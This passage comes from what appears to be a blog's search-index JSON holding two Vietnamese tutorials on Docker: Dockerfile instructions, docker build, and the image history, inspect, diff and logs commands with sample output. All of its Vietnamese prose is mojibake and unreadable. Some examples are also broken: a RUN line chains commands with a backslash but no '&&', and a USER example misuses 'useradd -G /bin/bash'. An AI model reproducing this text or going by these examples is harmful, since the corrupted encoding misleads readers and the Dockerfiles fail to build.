má»™t layer, vÃ  táº¥t cáº£ cÃ¡c tar file Ä‘Æ°á»£c giáº£i nÃ©n tá»›i cÃ¹ng mÃ´t vá»‹ trÃ­ thÃ¬ Learn Docker Foundation Deploying First Docker Container Pháº§n nÃ y chÃºng ta cÅ©ng Ä‘Ã£ trÃ¬nh bÃ y kÄ© á»Ÿ nhá»¯ng pháº§n trÆ°á»›c, theo sÆ¡ Ä‘á»“, ta cÃ³ thá»ƒ tháº¥y, Ä‘á»ƒ build má»™t docker container, chÃºng ta cÃ³ 5 bÆ°á»›c chÃ­nh:\nStep1: TÃ¬m kiáº¿m image thÃ­ch há»£p thÃ´ng qua lá»‡nh docker search, táº£i vá» báº±ng docker pull vÃ  cháº¡y báº±ng docker run Step2: Kiá»ƒm tra nhá»¯ng container Ä‘ang cháº¡y: docker ps: liá»‡t kÃª táº¥t cáº£ cÃ¡c container Ä‘ang cháº¡y vÃ  cÃ¡c thÃ´ng tin vá» nÃ³ docker inspect: cung cáº¥p thÃ´ng tin chi tiáº¿t vá» má»™t container Ä‘ang cháº¡y. docker logs: nhá»¯ng message mÃ  container Ä‘Ã£ log khi cháº¡y. Step3: Truy cáº­p vÃ o container Ä‘ang cháº¡y. á» Ä‘Ã¢y, Ä‘á»‘i vá»›i má»™t container Ä‘ang cháº¡y Ä‘á»ƒ láº¥y port cá»§a nÃ³ ta cÃ³ thá»ƒ dÃ¹ng má»™t trong 2 lá»‡nh: 1 2 docker ps docker port container_id port_number Step 4: Thiáº¿t láº­p chia sáº» dá»¯ liá»‡u giá»¯a container vÃ  host cÅ©ng nhÆ° cÃ¡c container vá»›i nhau, Ä‘áº£m báº£o dá»¯ liá»‡u cáº§n thiáº¿t sáº½ Ä‘Æ°á»£c lÆ°u khi container bá»‹ xÃ³a. Step 5: Cháº¡y container, á»Ÿ Ä‘Ã¢y cÃ³ má»™t sá»‘ thiáº¿t láº­p nhÆ° -d Ä‘á»ƒ cháº¡y ná»n hay -it Ä‘á»ƒ tÆ°Æ¡ng tÃ¡c vá»›i shell.\nNhá»¯ng pháº§n nÃ y chÃºng ta Ä‘Ã£ Ä‘Æ°á»£c há»c á»Ÿ nhá»¯ng bÃ i trÆ°á»›c. Deploy Static HTML Website as Container TÃ³m táº¯t cho pháº§n nÃ y\nCreate Dockerfile Docker file lÃ  gÃ¬? Dockerfile lÃ  má»™t dáº¡ng file text, khÃ´ng cÃ³ pháº§n Ä‘uÃ´i má»Ÿ rá»™ng, chá»©a táº­p cÃ¡c lá»‡nh mÃ´ táº£ cÃ¡c bÆ°á»›c Ä‘á»ƒ build má»™t docker image.\nCÃº phÃ¡p cá»§a má»™t dockerfile. Cáº¥u trÃºc chung cá»§a má»™t dockerfile cÃ³ dáº¡ng\nINSTRUCTION arguments Trong Ä‘Ã³:\nINSTRUCTION: lÃ  tÃªn cÃ¡c chá»‰ thá»‹ cÃ³ trong Dockerfile, má»—i chá»‰ thá»‹ thá»±c hiá»‡n má»™t nhiá»‡m vá»¥ nháº¥t Ä‘á»‹nh, do dockerfile quy Ä‘á»‹nh. Máº·c Ä‘á»‹nh, lá»‡nh nÃ y pháº£i Ä‘Æ°á»£c viáº¿t báº±ng chá»¯ IN HOA arguments: ná»™i dung mÃ  lá»‡nh thá»±c hiá»‡n\nVÃ­ dá»¥: 1 2 FROM nginx:alpine COPY . /usr/share/nginx/html DÃ²ng lá»‡nh 1 Ä‘á»ƒ Ä‘á»‹nh nghÄ©a base images vÃ  dÃ²ng lá»‡nh 2 Ä‘á»ƒ chá»‰ thá»‹ copy táº¥t cáº£ ná»™i dá»¥ng táº¡i vá»‹ trÃ­ hiá»‡n táº¡i vÃ o má»™t Ä‘á»‹a chá»‰ cá»¥ thá»ƒ trÃªn container, á»Ÿ Ä‘Ã¢y lÃ  /usr/share/nginx/html.\nCÃ¡c chá»‰ thá»‹ chÃ­nh trong dockerfile FROM\nChá»‰ Ä‘á»‹nh ráº±ng image nÃ o sáº½ Ä‘Æ°á»£c lÃ m cÆ¡ sá»Ÿ trong quÃ¡ trÃ¬nh build image Ä‘á»ƒ thá»±c thi nhá»¯ng cÃ¢u lá»‡nh tiáº¿p theo. CÃ¡c image nÃ y Ä‘Æ°á»£c táº£i vá» tá»« Public Repository hoáº·c Private Reppository riÃªng cá»§a má»—i ngÆ°á»i.\nChá»‰ thá»‹ FROM lÃ  báº¯t buá»™c vÃ  pháº£i Ä‘Æ°á»£c Ä‘áº·t trÃªn cÃ¹ng cá»§a Dockerfile\nCÃº phÃ¡p: 1 2 3 FROM \u0026lt;image\u0026gt; [AS \u0026lt;name\u0026gt;] FROM \u0026lt;image\u0026gt;[:\u0026lt;tag\u0026gt;] [AS \u0026lt;name\u0026gt;] FROM \u0026lt;image\u0026gt;[@\u0026lt;digest\u0026gt;] [AS \u0026lt;name\u0026gt;] VÃ­ dá»¥:\n1 2 3 FROM ubuntu hoáº·c FROM ubuntu:latest LABEL\nChá»‰ thá»‹ LABEL Ä‘Æ°á»£c dÃ¹ng Ä‘á»ƒ thÃªm cÃ¡c thÃ´ng tin meta vÃ o Docker Image khi chÃºng Ä‘Æ°á»£c build. ChÃºng tá»“n táº¡i dÆ°á»›i dáº¡ng cáº·p key-value, lÆ°u dÆ°á»›i dáº¡ng chuá»—i. CÃ³ thá»ƒ chá»‰ Ä‘á»‹nh nhiá»u label cho má»™t Docker Image, má»—i cáº·p key-value lÃ  duy nháº¥t.\nNáº¿u cÃ¹ng 1 key mÃ  cÃ³ nhiá»u value thÃ¬ value gáº§n nháº¥t sáº½ Ä‘Ã¨ nhá»¯ng value trÆ°á»›c Ä‘Ã³. CÃº phÃ¡p:\n1 LABEL \u0026lt;key1\u0026gt;\u0026lt;value1\u0026gt; \u0026lt;key2\u0026gt;\u0026lt;value2\u0026gt; ... \u0026lt;key_n\u0026gt;\u0026lt;value_n\u0026gt; CÃ³ thá»ƒ khai bÃ¡o metadata cho Image theo tá»«ng dÃ²ng chá»‰ thá»‹ hoáº·c cÃ³ thá»ƒ tÃ¡ch ra khai bÃ¡o thÃ nh tá»«ng dÃ²ng riÃªng biá»‡t.\nÄá»ƒ xem thÃ´ng tin meta cá»§a má»™t image, ta dÃ¹ng lá»‡nh docker inspect\n1 docker inspect \u0026lt;image id\u0026gt; MAINTAINER\nDÃ¹ng Ä‘á»ƒ khai bÃ¡o thÃ´ng tin tÃ¡c giáº£ cá»§a dockerfile\nCÃº phÃ¡p: 1 MAINTAINER \u0026lt;name\u0026gt; [\u0026lt;email\u0026gt;] VÃ­ dá»¥:\n1 MAINTAINER \u0026lt;edisc\u0026gt; [\u0026lt;edisc.ctf@gmail.com\u0026gt;] RUN\nDÃ¹ng Ä‘á»ƒ cháº¡y má»™t lá»‡nh nÃ o Ä‘Ã³ trong quÃ¡ trÃ¬nh build image, thÆ°á»ng lÃ  cÃ¡c cÃ¢u lá»‡nh Linux. TÃ¹y vÃ o image gá»‘c Ä‘Æ°á»£c khai bÃ¡o trong FROM thÃ¬ sáº½ cÃ³ cÃ¡c cÃ¢u lá»‡nh tÆ°Æ¡ng á»©ng.\nCÃº phÃ¡p: 1 2 RUN \u0026lt;command\u0026gt; RUN [\u0026#34;executable\u0026#34;, \u0026#34;param1\u0026#34;, \u0026#34;param2\u0026#34;] VÃ­ dá»¥\n1 2 RUN apt-get update -y RUN [\u0026#34;/bin/bash\u0026#34;, \u0026#34;-c\u0026#34;, \u0026#34;echo Run\u0026#34;] á» shell form, cÃ³ thá»ƒ thá»±c hiá»‡n nhiá»u cÃ¢u lá»‡nh báº±ng dáº¥u \\:\n1 2 3 4 FROM ubuntu:latest RUN apt-get update -y \\ apt-get install vim -y apt-get install curl -y ADD\nThá»±c hiá»‡n sao chÃ©p cÃ¡c tá»‡p, thÆ° má»¥c tá»« mÃ¡y Ä‘ang build hoáº·c remote file tá»« src vÃ  thÃªm chÃºng vÃ o filesystem cá»§a image dest\nCÃº phÃ¡p: 1 2 ADD [--chown=\u0026lt;user\u0026gt;:\u0026lt;group\u0026gt;] \u0026lt;src\u0026gt;... \u0026lt;dest\u0026gt; ADD [--chown=\u0026lt;user\u0026gt;:\u0026lt;group\u0026gt;] [\u0026#34;\u0026lt;src\u0026gt;\u0026#34;, ... \u0026#34;\u0026lt;dest\u0026gt;\u0026#34;] trong Ä‘Ã³:\nsrc cÃ³ thá»ƒ lÃ  má»™t hoáº·c nhiá»u file, thÆ° má»¥c dest lÃ  Ä‘á»‹a chá»‰ tuyá»‡t Ä‘á»‘i hoáº·c Ä‘Æ°á»£c chá»‰ Ä‘á»‹nh bá»Ÿi WORKDIR VÃ­ dá»¥:\n1 ADD --chown=user:mygroup file* /somedir/ COPY\nGiá»‘ng nhÆ° ADD lÃ  copy file tá»« thÆ° má»¥c src Ä‘áº¿n dest, khÃ¡c á»Ÿ viá»‡c COPY khÃ´ng há»— trá»£ copy cÃ¡c remote file URLs tá»« cÃ¡c nguá»“n trÃªn máº¡ng.\nCÃº phÃ¡p: 1 2 COPY [--chown=\u0026lt;user\u0026gt;:\u0026lt;group\u0026gt;] \u0026lt;src\u0026gt;... \u0026lt;dest\u0026gt; COPY [--chown=\u0026lt;user\u0026gt;:\u0026lt;group\u0026gt;] [\u0026#34;\u0026lt;src\u0026gt;\u0026#34;,... \u0026#34;\u0026lt;dest\u0026gt;\u0026#34;] ENV\nDÃ¹ng Ä‘á»ƒ khai bÃ¡o cÃ¡c biáº¿n mÃ´i trÆ°á»ng. CÃ¡c biáº¿n Ä‘Æ°á»£c khai bÃ¡o dÆ°á»›i dáº¡ng key-value báº±ng cÃ¡c chuá»—i. ChÃºng sáº½ Ä‘Æ°á»£c sá»­ dá»¥ng trong cÃ¡c chá»‰ thá»‹ tiáº¿p theo cá»§a Dockerfile.\nCÃº phÃ¡p: 1 ENV \u0026lt;key\u0026gt;=\u0026lt;value\u0026gt; VÃ­ dá»¥:\n1 2 ENV PORT=80 ENV USERNAME=\u0026#34;user\u0026#34; PASSWORD=\u0026#34;password\u0026#34; CÃ¡c biáº¿n mÃ´i trÆ°á»ng cÃ³ thá»ƒ thay Ä‘á»•i vá»›i lá»‡nh docker run\n1 docker run --env \u0026lt;key\u0026gt;=\u0026lt;value\u0026gt; CÃ¡c command Ä‘Æ°á»£c sá»­ dá»¥ng ENV:\n1 2 3 4 5 6 7 8 9 10 ADD COPY ENV EXPOSE FROM LABEL STOPSIGNAL USER VOLUME WORKDIR CMD\nDÃ¹ng Ä‘á»ƒ Ä‘á»‹nh nghÄ©a cÃ¡c cÃ¢u lá»‡nh Ä‘Æ°á»£c cháº¡y sau khi container Ä‘Æ°á»£c khá»Ÿi Ä‘á»™ng tá»« image vá»«a build.\nCÃº phÃ¡p: 1 2 3 CMD [\u0026#34;executable\u0026#34;, \u0026#34;param1\u0026#34;, \u0026#34;param2\u0026#34;] CMD [\u0026#34;param1\u0026#34;, \u0026#34;param2\u0026#34;] CMD command param1 param2 VÃ­ dá»¥:\n1 2 FROM ubuntu:latest CMD cat password.txt USER\nThiáº¿t láº­p username hoáº·c UID Ä‘á»ƒ sá»­ dá»¥ng khi cháº¡y image vÃ  khi cháº¡y cÃ¡c lá»‡nh cÃ³ trong RUN, CMD, ENTRYPOINT sau Ä‘Ã³.\nCÃº phÃ¡p: 1 2 3 USER \u0026lt;user\u0026gt;[:\u0026lt;group\u0026gt;] hoáº·c USER \u0026lt;UID\u0026gt;[:\u0026lt;GID\u0026gt;] VÃ­ dá»¥:\n1 2 3 FROM alpine:3.4 RUN useradd -G /bin/bash edisc USER edisc Build Docker Image Ta dÃ¹ng lá»‡nh docker build Ä‘á»ƒ tiáº¿n hÃ nh build docker image tá»« Dockerfile vá»«a táº¡o.\nCÃº phÃ¡p:\n1 docker build -t \u0026lt;image_name\u0026gt; \u0026lt;build directory\u0026gt; VÃ­ dá»¥:\n1 docker build -t myimage:v1 . -t á»Ÿ Ä‘Ã¢y cho phÃ©p chá»‰ Ä‘á»‹nh tÃªn image vÃ  tag cá»§a nÃ³.\nRUN Sau khi Ä‘Ã£ táº¡o thÃ nh image, ta chá»‰ cáº§n run nÃ³ vá»›i lá»‡nh docker run Ä‘á»ƒ tiáº¿n hÃ nh cháº¡y container.\nTá»•ng káº¿t Pháº§n nÃ y chÃºng ta Ä‘i qua 2 nhÃ¡nh chÃ­nh lÃ  What is the container vÃ  Container images, á»Ÿ Ä‘Ã³ chá»§ yáº¿u lÃ  nhá»¯ng kiáº¿n thá»©c chÃºng ta Ä‘Ã£ tháº£o luáº­n qua.\nNgoÃ i ra, chÃºng ta Ä‘Ã£ Ä‘i qua má»™t vÃ i nhÃ¡nh nhá» cá»§a Docker Foundation. VÃ¬ pháº§n nÃ y liÃªn quan Ä‘áº¿n má»¥c Ä‘Ã­ch cÃ´ng viá»‡c cá»§a tÃ´i, nÃªn tÃ´i sáº½ há»c kÄ© cÅ©ng nhÆ° tÃ¬m hiá»ƒu kÄ© pháº§n nÃ y. BÃ i tiáº¿p theo chÃºng ta sáº½ cÃ¹ng Ä‘i qua nhá»¯ng nhÃ¡nh káº¿ tiáº¿p.\n","description":"Ã”n láº¡i docker vÃ  chuyá»ƒn ná»™i dung há»c","id":18,"section":"posts","tags":["Docker"],"title":"TÃ¬m hiá»ƒu vÃ  sá»­ dá»¥ng docker (P6)","uri":"https://minhlongmt183.github.io/posts/docker_p6/"},{"content":"\rToÃ n bá»™ series nÃ y Ä‘Æ°á»£c tham kháº£o tá»« hai nguá»“n chÃ­nh: XuanThuLabChanel vÃ  DockerDoc. Em xin chÃ¢n thÃ nh cáº£m Æ¡n sá»± cá»‘ng hiáº¿n cá»§a cÃ¡c tÃ¡c giáº£ cá»§a nhá»¯ng kÃªnh nÃ³i trÃªn.â¤ï¸â¤ï¸â¤ï¸\rTra cá»©u thÃ´ng tin Image, Container vÃ  giÃ¡m sÃ¡t hoáº¡t Ä‘á»™ng container Docker CÃ¡c thÃ nh pháº§n táº¡o nÃªn Container ChÃºng ta Ä‘Ã£ tháº£o luáº­n vá» cÃ¡c khÃ¡i niá»‡m cÄƒn báº£n cá»§a docker á»Ÿ báº£i trÆ°á»›c, sau Ä‘Ã¢y lÃ  nhá»¯ng khÃ¡i niá»‡m trÃªn dÆ°á»›i gÃ³c nhÃ¬n cá»§a tÃ¡c giáº£.\nContainer: lÃ  má»™t há»™p kÃ­n Ä‘á»ƒ á»©ng dá»¥ng hoáº¡t Ä‘á»™ng. Má»—i container Ä‘Æ°á»£c táº¡o dá»±a trÃªn má»™t image. Khi cháº¡y má»™t container xuáº¥t phÃ¡t tá»« má»™t image, cÃ³ má»™t lá»›p (layer) Ä‘Æ°á»£c phÃ©p ghi thÃªm vÃ o trÃªn Ä‘á»‰nh cá»§a image. Do Ä‘Ã³ cÃ³ thá»ƒ xem: container = images + layer cho phÃ©p ghi. VÃ  khi muá»‘n lÆ°u container nÃ y láº¡i thÃ nh image má»›i, ta dÃ¹ng lá»‡nh docker commit. Image: nhÆ° má»™t áº£nh chá»¥p láº¡i cÃ¡c cáº¥u hÃ¬nh cá»§a container. Má»™t image á»Ÿ tráº¡ng thÃ¡i chá»‰ Ä‘á»c, má»i thá»© thay Ä‘á»•i chá»‰ Ä‘Æ°á»£c thay Ä‘á»•i á»Ÿ táº§ng trÃªn cÃ¹ng (Ä‘Æ°á»£c phÃ©p ghi) cá»§a container. Khi dÃ¹ng lá»‡nh docker commit, táº§ng nÃ y sáº½ trá»Ÿ thÃ nh tráº¡ng thÃ¡i chá»‰ Ä‘á»c. Do Ä‘Ã³, cÃ³ thá»ƒ tháº¥y má»—i image Ä‘á»u phá»¥ thuá»™c vÃ o má»™t hoáº·c nhiá»u image cha. platform Image: NÃ³ lÃ  image, nhÆ°ng nÃ³ khÃ´ng cÃ³ image cha, giá»‘ng nhÆ° bá»™ khung xÆ°Æ¡ng cá»§a má»™t chÃº khá»§ng long. NÃ³ chá»©a cÃ¡c biáº¿n mÃ´i trÆ°á»ng, cÃ¡c tiá»‡n Ã­ch Ä‘á»ƒ á»©ng dá»¥ng áº£o hÃ³a cháº¡y. Registry lÃ  kho chá»©a cÃ¡c image, nÆ¡i chia sáº», táº£i vá» cÃ¡c image. Dockerfile lÃ  má»™t file cáº¥u hÃ¬nh vá»›i cáº¥u trÃºc sinh ra image, nÃ³ giÃºp tá»± Ä‘á»™ng hÃ³a viá»‡c táº¡o, cháº¡y, sá»­ dá»¥ng cÃ¡c container.\náº¢nh trÃªn cho tháº¥y, docker báº¯t Ä‘áº§u vá»›i Platform Image Ä‘á»ƒ chá»©a cÃ¡c biáº¿n mÃ´i trÆ°á»ng cáº§n thiáº¿t Ä‘á»ƒ cháº¡y. Trong quÃ¡ trÃ¬nh container thá»±c thi sáº½ tiáº¿n hÃ nh cÃ i Ä‘áº·t, bá»• sung cáº¥u hÃ¬nh, Layered Images 1, Layered Images 2 lÃ  images cá»§a container sau khi thá»±c hiá»‡n lá»‡nh docker commit vÃ  nÃ³ á»Ÿ tráº¡ng thÃ¡i chá»‰ Ä‘á»c. docker image history DÃ¹ng Ä‘á»ƒ truy váº¥n thÃ´ng tin lá»‹ch sá»­ cÃ¡c thao tÃ¡c Ä‘á»ƒ hÃ¬nh thÃ nh nÃªn má»™t image. CÃº phÃ¡p:\n1 docker image history image_name Khi cháº¡y, ta Ä‘Æ°á»£c káº¿t quáº£ nhÆ° sau:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 â¯ docker image history php:8.1.0alpha1-fpm-buster IMAGE CREATED CREATED BY SIZE COMMENT 65167ddfe773 3 days ago /bin/sh -c #(nop) CMD [\u0026#34;php-fpm\u0026#34;] 0B \u0026lt;missing\u0026gt; 3 days ago /bin/sh -c #(nop) EXPOSE 9000 0B \u0026lt;missing\u0026gt; 3 days ago /bin/sh -c #(nop) STOPSIGNAL SIGQUIT 0B \u0026lt;missing\u0026gt; 3 days ago /bin/sh -c set -eux; cd /usr/local/etc; ifâ€¦ 26.6kB \u0026lt;missing\u0026gt; 3 days ago /bin/sh -c #(nop) WORKDIR /var/www/html 0B \u0026lt;missing\u0026gt; 3 days ago /bin/sh -c #(nop) ENTRYPOINT [\u0026#34;docker-php-eâ€¦ 0B \u0026lt;missing\u0026gt; 3 days ago /bin/sh -c docker-php-ext-enable sodium 17B \u0026lt;missing\u0026gt; 3 days ago /bin/sh -c #(nop) COPY multi:6dfba8f7e64bd54â€¦ 6.75kB \u0026lt;missing\u0026gt; 3 days ago /bin/sh -c set -eux; savedAptMark=\u0026#34;$(apt-mâ€¦ 104MB \u0026lt;missing\u0026gt; 3 days ago /bin/sh -c #(nop) COPY file:ce57c04b70896f77â€¦ 587B \u0026lt;missing\u0026gt; 3 days ago /bin/sh -c set -eux; savedAptMark=\u0026#34;$(apt-mâ€¦ 12.5MB \u0026lt;missing\u0026gt; 3 days ago /bin/sh -c #(nop) ENV PHP_SHA256=131a81ef9eâ€¦ 0B \u0026lt;missing\u0026gt; 3 days ago /bin/sh -c #(nop) ENV PHP_URL=https://downlâ€¦ 0B \u0026lt;missing\u0026gt; 3 days ago /bin/sh -c #(nop) ENV PHP_VERSION=8.1.0alphâ€¦ 0B \u0026lt;missing\u0026gt; 3 days ago /bin/sh -c #(nop) ENV GPG_KEYS=528995BFEDFBâ€¦ 0B \u0026lt;missing\u0026gt; 4 weeks ago /bin/sh -c #(nop) ENV PHP_LDFLAGS=-Wl,-O1 -â€¦ 0B \u0026lt;missing\u0026gt; 4 weeks ago /bin/sh -c #(nop) ENV PHP_CPPFLAGS=-fstack-â€¦ 0B \u0026lt;missing\u0026gt; 4 weeks ago /bin/sh -c #(nop) ENV PHP_CFLAGS=-fstack-prâ€¦ 0B \u0026lt;missing\u0026gt; 4 weeks ago /bin/sh -c #(nop) ENV PHP_EXTRA_CONFIGURE_Aâ€¦ 0B \u0026lt;missing\u0026gt; 4 weeks ago /bin/sh -c set -eux; mkdir -p \u0026#34;$PHP_INI_DIRâ€¦ 0B \u0026lt;missing\u0026gt; 4 weeks ago /bin/sh -c #(nop) ENV PHP_INI_DIR=/usr/locaâ€¦ 0B \u0026lt;missing\u0026gt; 4 weeks ago /bin/sh -c set -eux; apt-get update; apt-gâ€¦ 227MB \u0026lt;missing\u0026gt; 4 weeks ago /bin/sh -c #(nop) ENV PHPIZE_DEPS=autoconf â€¦ 0B \u0026lt;missing\u0026gt; 4 weeks ago /bin/sh -c set -eux; { echo \u0026#39;Package: phpâ€¦ 46B \u0026lt;missing\u0026gt; 4 weeks ago /bin/sh -c #(nop) CMD [\u0026#34;bash\u0026#34;] 0B \u0026lt;missing\u0026gt; 4 weeks ago /bin/sh -c #(nop) ADD file:7362e0e50f30ff454â€¦ 69.3MB Qua dá»¯ kiá»‡n trÃªn ta biáº¿t tá»« thao tÃ¡c cÆ¡ sá»Ÿ Ä‘Ã£ tráº£i qua nhá»¯ng bÆ°á»›c nÃ o Ä‘á»ƒ cÃ³ thá»ƒ táº¡o thÃ nh image php\ndocker inspect Lá»‡nh nÃ y tráº£ vá» thÃ´ng tin cá»§a image dÆ°á»›i dáº¡ng JSON\n1 docker inspect image_name/id Lá»‡nh nÃ y liá»‡t kÃª táº¥t cáº£ cÃ¡c thÃ´ng tin vá» image, vÃ­ dá»¥ sau Ä‘Ã¢y lÃ  má»™t pháº§n thÃ´ng tin vá» cÃ¡c lá»›p layer cá»§a image php\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 \u0026#34;RootFS\u0026#34;: { \u0026#34;Type\u0026#34;: \u0026#34;layers\u0026#34;, \u0026#34;Layers\u0026#34;: [ \u0026#34;sha256:02c055ef67f5904019f43a41ea5f099996d8e7633749b6e606c400526b2c4b33\u0026#34;, \u0026#34;sha256:d2252dfd3726823303a8f54483e10f3ed7959f33ba63ea3a19bd0fc46587bc8f\u0026#34;, \u0026#34;sha256:6c63b3f282cb455ac2e456fb99cdceab42a876603b54cc97087c17b9999b780b\u0026#34;, \u0026#34;sha256:8e859e616115511355eadb05cbdcf86333434621f77c3ac80c410257ea39f115\u0026#34;, \u0026#34;sha256:363c2d4617a0df71a4d53f484a522caa9f2f02ba1271c7f7b4ceb524c5bac61a\u0026#34;, \u0026#34;sha256:c66c7f1f8019ed243ea38cb9ca384135cfeb3cda372de18deece786702c0c582\u0026#34;, \u0026#34;sha256:d87b1d289a070d7d2503bfedb8263ff5431423cd9eca8e577ce93d2e74392315\u0026#34;, \u0026#34;sha256:7d973749b6e2ff44d90f4df11576a27388c317f99400b746e8d8c021a747c91f\u0026#34;, \u0026#34;sha256:d5677f1776e8f36c5ba0cd40ff850a2e1ce919e22019bb76529ce6102c7b89ab\u0026#34;, \u0026#34;sha256:1cce6b181873aeb25ca52478d8f6c6b1c66213689085cc7a89e229ea045abd24\u0026#34; ] }, BÃªn cáº¡nh Ä‘Ã³, lá»‡nh nÃ y cÃ²n cÃ³ thá»ƒ tra cá»©u thÃ´ng tin chi tiáº¿t cá»§a container, chÃºng ta chá»‰ cáº§n thay tÃªn/id cá»§a image thÃ nh tÃªn/id cá»§a container Ä‘á»ƒ tra cá»©u thÃ´ng tin chi tiáº¿t cá»§a container.\ndocker diff NhÆ° Ä‘Ã£ nÃ³i á»Ÿ trÃªn, má»™t container Ä‘Æ°á»£c sinh ra tá»« má»™t platform image, sau khi docker cháº¡y, cÃ i Ä‘áº·t, chá»‰nh sá»­a, thay Ä‘á»•i cáº¥u trÃºc bÃªn trong rá»“i commit láº¡i thÃ nh nhá»¯ng layer. Äá»ƒ xem nhá»¯ng thay Ä‘á»•i cá»§a cáº¥u trÃºc thÆ° má»¥c bÃªn trong tá»« thá»i Ä‘iá»ƒm táº¡o ra Ä‘áº¿n thá»i Ä‘iá»ƒm hiá»‡n táº¡i, ta dÃ¹ng lá»‡nh docker diff. CÃº phÃ¡p:\n1 docker diff container_id/name VÃ­ dá»¥, ta kiá»ƒm tra tá»« lÃºc táº¡o ra cho Ä‘áº¿n thá»i Ä‘iá»ƒm hiá»‡n táº¡i, cáº¥u trÃºc thÆ° má»¥c bÃªn trong container c-php Ä‘Ã£ thay Ä‘á»•i nhÆ° tháº¿ nÃ o:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 â¯ docker diff c-php C /home A /home/SharedData C /usr C /usr/local C /usr/local/lib C /usr/local/lib/php C /usr/local/lib/php/extensions C /usr/local/lib/php/extensions/no-debug-non-zts-20201009 A /usr/local/lib/php/extensions/no-debug-non-zts-20201009/mysqli.so A /usr/local/lib/php/extensions/no-debug-non-zts-20201009/pdo_mysql.so C /usr/local/etc C /usr/local/etc/php C /usr/local/etc/php/conf.d A /usr/local/etc/php/conf.d/docker-php-ext-mysqli.ini A /usr/local/etc/php/conf.d/docker-php-ext-pdo_mysql.ini C /usr/local/include C /usr/local/include/php C /usr/local/include/php/ext A /usr/local/include/php/ext/mysqli A /usr/local/include/php/ext/mysqli/php_mysqli_structs.h A /usr/local/include/php/ext/mysqli/mysqli_mysqlnd.h á»Ÿ Ä‘Ã¢y kÃ­ tÆ° C thá»ƒ hiá»‡n ráº±ng thÆ° má»¥c Ä‘Ã³ Ä‘Ã£ Ä‘Æ°á»£c cáº­p nháº­t, cÃ²n A lÃ  thÆ° má»¥c Ä‘Ã³ vá»«a Ä‘Æ°á»£c thÃªm vÃ o.\ndocker log Khi container hoáº¡t Ä‘á»™ng, dáº¥u váº¿t hoáº¡t Ä‘á»™ng cá»§a nÃ³ Ä‘Æ°á»£c ghi vÃ o há»‡ thá»‘ng log cá»§a container. Äá»ƒ kiá»ƒm tra log cá»§a container, chÃºng ta dÃ¹ng lá»‡nh:\n1 docker logs container_name/id VÃ­ dá»¥ ta kiá»ƒm tra log cá»§a c-php xem trong quÃ¡ trÃ¬nh hoáº¡t Ä‘á»™ng nÃ³ Ä‘Ã£ ghi nhá»¯ng gÃ¬:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 â¯ docker logs c-php [11-Jun-2021 07:15:23] NOTICE: fpm is running, pid 1 [11-Jun-2021 07:15:23] NOTICE: ready to handle connections 172.23.0.4 - 11/Jun/2021:07:16:07 +0000 \u0026#34;POST /wp-admin/setup-config.php\u0026#34; 500 [11-Jun-2021 07:17:34] NOTICE: Finishing ... [11-Jun-2021 07:17:34] NOTICE: exiting, bye-bye! [11-Jun-2021 07:17:35] NOTICE: fpm is running, pid 1 [11-Jun-2021 07:17:35] NOTICE: ready to handle connections 172.23.0.4 - 11/Jun/2021:07:17:42 +0000 \u0026#34;POST /wp-admin/setup-config.php\u0026#34; 500 172.23.0.4 - 11/Jun/2021:07:17:48 +0000 \u0026#34;POST /wp-admin/setup-config.php\u0026#34; 500 172.23.0.4 - 11/Jun/2021:07:17:53 +0000 \u0026#34;GET /index.php\u0026#34; 302 172.23.0.4 - 11/Jun/2021:07:17:53 +0000 \u0026#34;GET /wp-admin/setup-config.php\u0026#34; 200 172.23.0.4 - 11/Jun/2021:07:17:58 +0000 \u0026#34;GET /wp-admin/setup-config.php\u0026#34; 200 172.23.0.4 - 11/Jun/2021:07:18:19 +0000 \u0026#34;POST /wp-admin/setup-config.php\u0026#34; 500 172.23.0.4 - 11/Jun/2021:07:22:34 +0000 \u0026#34;POST /wp-admin/setup-config.php\u0026#34; 500 172.23.0.4 - 11/Jun/2021:07:22:43 +0000 \u0026#34;GET /index.php\u0026#34; 302 172.23.0.4 - 11/Jun/2021:07:22:43 +0000 \u0026#34;GET /wp-admin/setup-config.php\u0026#34; 200 172.23.0.4 - 11/Jun/2021:07:23:32 +0000 \u0026#34;GET /wp-admin/setup-config.php\u0026#34; 200 172.23.0.4 - 11/Jun/2021:07:24:31 +0000 \u0026#34;POST /wp-admin/setup-config.php\u0026#34; 500 172.23.0.4 - 11/Jun/2021:07:26:46 +0000 \u0026#34;POST /wp-admin/setup-config.php\u0026#34; 500 172.23.0.4 - 11/Jun/2021:07:36:12 +0000 \u0026#34;POST /wp-admin/setup-config.php\u0026#34; 500 172.23.0.4 - 11/Jun/2021:10:39:55 +0000 \u0026#34;GET /index.php\u0026#34; 302 172.23.0.4 - 11/Jun/2021:10:39:55 +0000 \u0026#34;GET /wp-admin/setup-config.php\u0026#34; 200 172.23.0.4 - 11/Jun/2021:10:39:59 +0000 \u0026#34;GET /wp-admin/setup-config.php\u0026#34; 200 172.23.0.4 - 11/Jun/2021:10:40:43 +0000 \u0026#34;POST /wp-admin/setup-config.php\u0026#34; 500 172.23.0.4 - 11/Jun/2021:11:16:52 +0000 \u0026#34;POST /wp-admin/setup-config.php\u0026#34; 500 [11-Jun-2021 11:19:58] NOTICE: Finishing ... [11-Jun-2021 11:19:58] NOTICE: exiting, bye-bye! [11-Jun-2021 11:20:00] NOTICE: fpm is running, pid 1 [11-Jun-2021 11:20:00] NOTICE: ready to handle connections 172.23.0.4 - 11/Jun/2021:11:20:05 +0000 \u0026#34;POST /wp-admin/setup-config.php\u0026#34; 500 172.23.0.4 - 11/Jun/2021:11:20:09 +0000 \u0026#34;GET /index.php\u0026#34; 302 172.23.0.4 - 11/Jun/2021:11:20:09 +0000 \u0026#34;GET /wp-admin/setup-config.php\u0026#34; 200 172.23.0.4 - 11/Jun/2021:11:22:19 +0000 \u0026#34;GET /wp-admin/setup-config.php\u0026#34; 200 172.23.0.4 - 11/Jun/2021:11:22:43 +0000 \u0026#34;POST /wp-admin/setup-config.php\u0026#34; 500 [11-Jun-2021 11:27:42] NOTICE: Finishing ... [11-Jun-2021 11:27:42] NOTICE: exiting, bye-bye! [14-Jun-2021 02:55:15] NOTICE: fpm is running, pid 1 [14-Jun-2021 02:55:15] NOTICE: ready to handle 